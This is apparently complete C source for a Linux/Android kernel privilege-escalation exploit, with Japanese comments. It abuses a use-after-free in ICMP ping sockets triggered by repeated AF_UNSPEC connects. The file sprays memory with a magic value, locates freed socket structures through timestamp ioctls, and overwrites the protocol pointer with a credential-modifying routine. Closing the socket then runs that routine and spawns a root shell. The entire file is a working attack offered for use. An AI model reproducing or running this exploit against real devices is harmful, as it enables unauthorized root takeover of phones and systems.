#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

#define MAX_CHILDREN_PROCESS    1024
#define MAX_CHILDREN_SOCKETS    65000
#define MAX_MMAPS               1024

#define MMAP_ADDRESS(x)         (0x10000000 + (x) * MMAP_SIZE)
#define MMAP_BASE(x)		(((unsigned)(x)) & ~(MMAP_SIZE - 1))
#define MMAP_SIZE               (16 * 1024 * 1024)

#define DEFAULT_RESERVE_SIZE    (64 * 1024 * 1024)

#define TIMESTAMP_MAGIC         0x0db4da5f//チェック用のマジック値

#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))

#define OFFSET_SK_PROT          0x24
#define OFFSET_SK_STAMP         0x148
#define OFFSET_MC_LIST          0x1c4

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS            0x8907
#endif /* SIOCGSTAMPNS */

#define NSEC_PER_SEC            1000000000

#define LIST_POISON2            0x00200200//64bit linuxの場合は0xdead000000000000

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))


extern void obtain_root_privilege_by_modify_task_cred(void);

struct child_status_t {
  int num_sockets;
  int result;
};

/* ページサイズの取得 */
static size_t
get_page_size(void)
{
  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE); //バイト単位でページサイズを取得
  }

  return pagesize;
}
/* ページサイズの取得 ここまで */

/* オープン可能なファイルディスクリプタの最大数を設定 */
static int
maximize_fd_limit(void)
{
  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim); //プロセスがオープン出来るディスクリプタの最大数 +1 を取得
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim); //プロセスがオープン出来るディスクリプタの最大数(リミット)に +1 を設定

  ret = getrlimit(RLIMIT_NOFILE, &rlim); //プロセスがオープン出来るディスクリプタの最大数 +1 を取得
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur; //設定したリミット数を返す
}
/* オープン可能なファイルディスクリプタの最大数を設定 ここまで */

/* ソケット利用の待ち処理 */
static int
wait_for_sockets_created(int pipe_fds[2], int *num_socks_created)
{
  struct timeval timeout;
  fd_set rfds;
  struct child_status_t status;
  int ret;

  *num_socks_created = 0;

  FD_ZERO(&rfds);
  FD_SET(pipe_fds[0], &rfds);

  timeout.tv_sec = 5;
  timeout.tv_usec = 0;

  ret = select(pipe_fds[0] + 1, &rfds, NULL, NULL, &timeout);
  if (ret == -1) {
    perror("select()");
    return -1;
  }

  if (ret == 0) {
    return -1;
  }

  ret = read(pipe_fds[0], &status, sizeof status);
  if (ret == -1) {
    perror("read()");
    return -1;
  }

  if (ret != sizeof (status)) {
    printf("read(): Unexpected EOF\n");
    return -1;
  }

  *num_socks_created = status.num_sockets;

  return status.result;
}
/* ソケット利用の待ち処理 ここまで */

/* 子プロセスから親プロセスへステータスの受け渡し */
static int
send_status_to_parent(int pipe_fds[2], int num_sockets, int result)
{
  struct child_status_t status;

  memset(&status, 0, sizeof status);

  status.num_sockets = num_sockets;
  status.result = result;

  write(pipe_fds[1], &status, sizeof status);
  close(pipe_fds[1]);

  return 0;
}
/* 子プロセスから親プロセスへステータスの受け渡し */

static int
wait_to_close(int pipe_fds[2])
{
  char buf[256];

  read(pipe_fds[0], buf, sizeof buf);
  close(pipe_fds[0]);
}

/* ファイルディスクリプタを閉じる */
static int
close_all_fds_except_pipe(int pipe_fds[2], int num_fds)
{
  int i;
  int result;

  result = 0;

  for (i = 0; i < num_fds; i++) {
    int ret;

    if (i == pipe_fds[0] || i == pipe_fds[1]) {
      continue;//pipe_fds[0]とpipe_fds[1]が一致するならばcloseせずにコンティニュー
    }

    ret = close(i);//ソケットを閉じる
    if (ret != 0) {
      result = -1;
    }
  }

  return result;
}
/* ファイルディスクリプタを閉じる ここまで */

/* 攻撃対象のソケットを設定 (exploit本体) */
static int
setup_vul_socket(int sock)
{
  struct sockaddr_in sa;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_UNSPEC;

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect(%d) #1: ret = %d\n", sock, ret);
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect%d() #2: ret = %d\n", sock, ret);
    return -1;
  }

  return 0;
}
/* 攻撃対象のソケットを設定 (exploit本体)　ここまで */

/* ICMPソケットの作成 */
static int
create_icmp_socket(void)
{
  struct sockaddr_in sa;
  int sock;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_INET;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
  if (sock == -1) {
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    int result;

    result = errno;
    close(sock);
    errno = result;

    return -1;
  }

  return sock;
}
/* ICMPソケットの作成 ここまで */

static int
close_icmp_socket(int sock)
{
  return close(sock);
}

/* 子プロセスを利用してソケットを操作 */
static int
do_child_task(int pipe_fds[2], int num_fds)
{
  int socks[num_fds];
  int result;
  int ret;
  int i;

  result = 0;

  close_all_fds_except_pipe(pipe_fds, num_fds);//オープンしたディスクリプタを閉じる

  for (i = 0; i < num_fds; i++) {
    socks[i] = create_icmp_socket();// ICMPソケットを作成
    if (socks[i] == -1) {
      result = errno;
      break;
    }
  }

  num_fds = i;

  send_status_to_parent(pipe_fds, num_fds, result);//子プロセスから親プロセスにステータスを受け渡す
  wait_to_close(pipe_fds);

  for (i = 0; i < num_fds; i++) {
    ret = close_icmp_socket(socks[i]);//子プロセスのソケットを閉じる
  }

  if (ret == -1) {
    return -1;
  }

  return 0;
}
/* 子プロセスを利用してソケットを操作 ここまで */

/* 子プロセスを生成  */
static int
create_child(int pipe_fds[2], int num_fds, pid_t *pid, int *num_socks_created)
{
  int ret;

  *pid = -1;
  *num_socks_created = 0;

  ret = pipe(pipe_fds);//パイプの作成
  if (ret != 0) {
    perror("pipe()");
    return -1;
  }

  *pid = fork();//子プロセスを生成
  if (*pid == -1) {
    perror("fork()");
    return -1;
  }

  if (*pid == 0) {
    do_child_task(pipe_fds, num_fds);//子プロセスを利用する
    exit(0);
  }

  ret = wait_for_sockets_created(pipe_fds, num_socks_created);//ソケット利用の待ち処理
  if (ret == EMFILE) {
    ret = 0;
  }

  if (ret != 0) {
    kill(*pid,  SIGKILL);//プロセスを強制終了
  }

  return ret;
}
/* 子プロセスを生成 ここまで */

/* 子プロセスが作成したソケットを閉じる  */
static int
close_child_sockets(int pipe_fds[2], pid_t pid)
{
  int timeout;
  int status;
  int success;
  int ret;

  success = 0;

  close(pipe_fds[0]);//パイプを閉じる
  close(pipe_fds[1]);//パイプを閉じる

  for (timeout = 100; timeout > 0; timeout--) {
    ret = waitpid(pid, &status, WNOHANG);//プロセスの一時停止を試みる。変化が無い場合は復帰
    if (ret != 0) {
      break;//プロセスの一時停止に成功すればループ脱出
    }

    if (WIFEXITED(status)) {
      success = 1;
      break;
    }

    usleep(10000);
  }

  kill(pid,  SIGKILL);//プロセスを強制終了させる

  ret = waitpid(pid, &status, 0);//プロセスの一時停止を試みる。
  if (ret != 0) {
    return -1;
  }

  if (WIFEXITED(status)) {
    success = 1;//子プロセスが正常に終了した
  }

  if (success) {
    return 0;
  }

  return -1;
}
/* 子プロセスが作成したソケットを閉じる ここまで */

/* ソケットの作成する */
int *
create_vul_sockets(void)
{
  static pid_t pids[MAX_CHILDREN_PROCESS];
  static int pipe_fds[MAX_CHILDREN_PROCESS][2];
  int max_fds;
  int *socks;
  int num_socks;
  int num_children_process;
  int num_children_socks;
  int ret;
  int i;

  printf("Creating target socket..."); 
  fflush(stdout); //バッファを吐き出させる

  max_fds = maximize_fd_limit(); //オープン可能なファイルディスクリプタの最大数を設定

  socks = malloc((max_fds + 1) * sizeof (*socks));  //設定したディスクリプタ数 +1 長だけメモリ確保
  if (!socks) {
    printf("\nNo memory\n");
    return NULL;
  }

  num_socks = 0;
  num_children_socks = 0;
  ret = 0;

  for (i = 0; i < MAX_CHILDREN_PROCESS; i++) {
    int max_children_socks;
    int num_socks_created;

    max_children_socks = max_fds;//max_children_socks <- オープン可能なディスクリプタの最大数 +1
    if (max_children_socks + num_children_socks > MAX_CHILDREN_SOCKETS) {
      max_children_socks = MAX_CHILDREN_SOCKETS - num_children_socks;
      if (max_children_socks < 1) {
        break; //max_children_socksが整数かつnum_children_socksがMAX_CHILDREN_SOCKETS以上の場合ループ脱出
      }
    }

    ret = create_child(pipe_fds[i], max_children_socks, &pids[i], &num_socks_created);//子プロセスを生成
    if (pids[i] == -1) {
      break;
    }

    num_children_process++;
    num_children_socks += num_socks_created;

    printf(".");
    fflush(stdout);

    if (num_socks < max_fds) {
      socks[num_socks] = create_icmp_socket();//ICMPソケットを作成
      if (socks[num_socks] == -1) {
        break;
      }

      num_socks++;
    }

    if (ret != 0) {
      break;//タイムスタンプ設置に成功すればループ脱出
    }

  }

  printf(" OK\n");
  printf("%d + %d sockets created\n", num_socks, num_children_socks);

  for (i = 0; i < num_children_process; i++) {
    close_child_sockets(pipe_fds[i], pids[i]);
  }

  if (num_socks < 1) {
    printf("No icmp socket available\n");
    free(socks);
    return NULL;
  }

  socks[num_socks] = -1;

  for (i = 0; i < num_socks; i++) {
    ret = setup_vul_socket(socks[i]);//攻撃対象のソケットを設定
  }

  return socks;
}
/* ソケットの作成 ここまで */

/* メモリ領域を陣取る */
static int
lock_page_in_memory(void *address, size_t size)
{
  int ret;

  ret = mlock(address, size); //他プロセスに該当アドレスを使用されないようにアドレスをロック
  if (ret != 0) {
    return -1;
  }

  return 0;
}
/* メモリ領域を陣取る ここまで */

static void
populate_pagetable_for_address(void *address)
{
  *(void **)address = NULL;
}

/* LIST_POISON2をマッピングしてクラッシュ(リブート)を防ぐ */
static void *
protect_crash_when_double_free(void)
{
  void *address;
  size_t pagesize;

  pagesize = get_page_size();//ページサイズの取得

  address = (void *)((LIST_POISON2 / pagesize) * pagesize); //ページサイズを基にアドレスを取得

  address =  mmap(address, pagesize,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0); //LIST_POISON2をマッピング

  if (address == MAP_FAILED) {
    return NULL;
  }

  populate_pagetable_for_address(address);
  lock_page_in_memory(address, pagesize);//マッピングしたメモリ領域を陣取る

  return address; //確保したアドレスを返す
}
/* LIST_POISON2をマッピングしてクラッシュ(リブート)を防ぐ ここまで */

/* 必要が無くなったLIST_POISON2を開放する */
static int
free_protect(void *protect)
{
  size_t pagesize;

  pagesize = get_page_size();//ページサイズの取得
  return munmap(protect, pagesize);//アンマップ
}
/* 必要が無くなったLIST_POISON2を開放する ここまで */

/* マジック値を埋め込む */
static void
fill_with_payload(void *address, size_t size)
{
  unsigned *p = address;
  int i;

  for (i = 0; i < size; i += sizeof (*p) * 2) {
    *p++ = (unsigned)p;
    *p++ = TIMESTAMP_MAGIC;
  }
}
/* マジック値を埋め込む ここまで */

/* タイムスタンプを基に攻撃に利用可能なソケット(アドレス)を探す */
static int
get_sk_from_timestamp(int sock)
{
  struct timespec tv;
  uint64_t value;
  unsigned high;
  unsigned low;
  int ret;

  ret = ioctl(sock, SIOCGSTAMPNS, &tv);//ioctlによってdword(double-word)を取得
  if (ret != 0) {
    return -1;
  }

  value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
  high = (unsigned)(value >> 32);
  low = (unsigned)value;// high = low >> 32

  if (high == TIMESTAMP_MAGIC) {
    return low - OFFSET_SK_STAMP;//マジック値が一致した(gadgetを設置可能なアドレスを見つけた)ため該当アドレスを返す
  }

  return 0;
}
/* タイムスタンプを基に攻撃に利用可能なソケット(アドレス)を探す ここまで */

/* 攻撃に利用可能なソケットの作成を試みる */
static int
try_control_sk(int *socks)
{
  static int reserve_size = DEFAULT_RESERVE_SIZE;
  static int loop_count = 0;
  static void *address[MAX_MMAPS];
  struct sysinfo info;
  int success;
  int count;
  int i;
  int ret;

  success = 0;

  loop_count++;

  for (i = 0; i < MAX_MMAPS; i++) {
    int j;

    ret = sysinfo(&info);
    if (ret == 0) {
      if (info.freeram < reserve_size) {
        if (loop_count < 4) {
          reserve_size = info.freeram;
        }

        break;
      }
    }

    address[i] =  mmap((void *)MMAP_ADDRESS(i), MMAP_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (address[i] == MAP_FAILED) {
      printf("mmap(): failed: %s (%d)\n", strerror(errno), errno);
      break;
    }

    lock_page_in_memory(address[i], MMAP_SIZE);
    fill_with_payload(address[i], MMAP_SIZE);//攻撃に利用可能なソケットであるかチェックするためのマジック値を仕込む

    for (j = 0; socks[j] != -1; j++) {
      ret = get_sk_from_timestamp(socks[j]);//タイムスタンプを基に攻撃に利用可能なアドレスを探す
      if (ret > 0) {
        success = 1;
        address[i] = 0;
      }
    }

    if (success) {
      break;
    }
  }

  count = i;
  printf("%d bytes allocated\n", count * MMAP_SIZE);

  for (i = 0; i < count; i++) {
    if (address[i]) {
      munmap(address[i], MMAP_SIZE);
    }
  }

  if (success) {
    return 0;
  }

  return -1;
}
/* 攻撃に利用可能なソケットの作成を試みる ここまで */

/* 昇格するための準備 */
static int
setup_get_root(void *sk)
{
  static unsigned prot[256];
  unsigned *mmap_end_address;
  unsigned *p;
  int i;

  for (i = 0; i < ARRAY_SIZE(prot); i++) {
    prot[i] = (unsigned)obtain_root_privilege_by_modify_task_cred;//攻撃コードを仕込む
  }

  mmap_end_address = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;//ソケットのポインタとメモリマップサイズを基に終点アドレスを設定

  for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = 0;
  }

  for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = (unsigned)prot;//攻撃コードをポインタに仕込む
  }
}
/* 昇格するための準備 ここまで */

/* 病弱なソケットさんを維持させる(リブートを防ぐ) */
static void
keep_invalid_sk(void)
{
  pid_t pid;

  printf("\n");
  printf("There are some invalid sockets.\n");
  printf("Please reboot now to avoid crash...\n");

  pid = fork();
  if (pid == -1 || pid == 0) {
    close(0);
    close(1);
    close(2);

    while (1) {
      sleep(60);
    }
  }
}
/* 病弱なソケットさんを維持させる(リブートを防ぐ) ここまで */

/* 昇格するための関数 */
static void
do_get_root(int *socks)
{
  int success;
  int has_invalid_sk;
  int ret;
  int i;

  success = 0;
  has_invalid_sk = 0;

  for (i = 0; socks[i] != -1; i++) {
    void *sk;

    ret = get_sk_from_timestamp(socks[i]);
    if (ret <= 0) {
      has_invalid_sk = 1;
      continue;//攻撃対象のソケットではないためコンティニュー
    }

    success = 1;

    sk = (void *)ret;
    setup_get_root(sk);//昇格するための準備

    close_icmp_socket(socks[i]);//ソケットを閉じる事で攻撃コードが実行される(昇格)
  }

  if (success) {
    system("/system/bin/sh");
  }

  if (has_invalid_sk) {
    keep_invalid_sk();//病弱なソケットさんを維持させる
  }
}
/* 昇格するための関数　ここまで */

int
main(int argc, char *const argv[])
{
  void *protect = NULL;
  int *socks;
  int ret;

  protect = protect_crash_when_double_free();//クラッシュを防ぐ為にLIST_POISON2を埋める
  if (!protect) {
    printf("Error in protect_crash_when_double_free()\n");
    return 1;
  }

  socks = create_vul_sockets(); //ソケットを作成
  if (socks == NULL) {
    return 1;
  }

  while (1) {
    ret = try_control_sk(socks);//攻撃に利用可能なソケットの作成を試みる
    if (ret == 0) {
      printf("Done!\n");
      break;
    }
  }

  do_get_root(socks);//昇格を試みる

  if (protect) {
    ret = free_protect(protect);//LIST_POISON2を開放
    if (ret != 0) {
      printf("Error in free_protect()\n");
      return -1;
    }
  }

  return 0;
}
